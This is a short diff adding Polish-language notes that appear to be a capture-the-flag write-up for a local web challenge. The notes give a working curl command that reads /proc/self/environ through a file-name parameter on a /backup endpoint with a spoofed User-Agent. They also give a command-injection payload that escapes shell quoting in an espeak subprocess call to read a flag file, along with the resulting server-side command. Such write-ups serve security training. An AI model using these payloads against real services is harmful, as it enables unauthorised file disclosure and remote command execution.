@@ -1,0 +1,22 @@
+1. /robots.txt - znajdujemy linki, traversujemy je
+2. link /backup robi redirect na rick rolld i zwraca kod bledu 416 I AM A TEAPOT
+3. musimy ustawic User-agent: magic dla /backup - tak jak bylo w robots.txt - dostajemy kod zrodlowy apki
+4. Okazuje sie ze /backup przyjmuje nazwe pliku jako query param, mozemy dostac sei do envvarow i dostac pierwsza flage:
+curl http://0.0.0.0:40010/backup?fname=/proc/self/environ -H User-agent:magic -vvv --output o && cat o
+
+5. Druga flaga - trzeba zrobic command injection, ktory jest w subprocess.check_output. Przydatne moze byc takie cos w ipythonie:
+```
+f = lambda c: ('espeak {}'.format(shlex.quote(c)) + ' > {0}').format("'/tmp/cos'")
+```
+^ i tym mozna dosc fajnie testowac sobie command injection
+
+Rozwiazanie command injection:
+```
+{0[0]} >/dev/null; espeak --stdout $(cat /tmp/flag_2) -a {0[0]}100
+```
+Powoduje wykonanie na serwerze:
+```
+espeak --stdout '' >/dev/null; espeak --stdout $(cat /tmp/flag_2) -a '100' > '/tmp/c6b9f097-3c99-46a2-9b89-61dfabd8e382'
+```
+
+
